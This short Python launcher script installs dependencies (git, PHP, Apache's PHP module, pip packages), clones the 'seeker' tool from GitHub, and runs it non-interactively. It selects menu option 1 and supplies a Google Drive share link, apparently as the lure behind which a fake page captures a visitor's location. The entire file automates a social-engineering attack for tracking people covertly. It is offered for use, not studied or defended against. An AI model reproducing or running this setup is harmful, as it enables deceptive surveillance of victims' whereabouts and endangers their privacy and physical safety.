import subprocess

subprocess.run('apt-get install git', shell = True)

subprocess.run('git clone https://github.com/thewhiteh4t/seeker.git', shell = True)

subprocess.run('apt -y install python-is-python3', shell = True)

subprocess.run('apt -y install php libapache2-mod-php', shell = True)

subprocess.run('pip3 install requests', shell = True)

subprocess.run('pip3 install packaging', shell = True)

subprocess.run('printf "1\nhttps://drive.google.com/file/d/1ITGfZ10xfU7zEYRK6tKLgHJrLS7mPJrl/view?usp=sharing" | python3 seeker.py', shell = True, cwd='./seeker')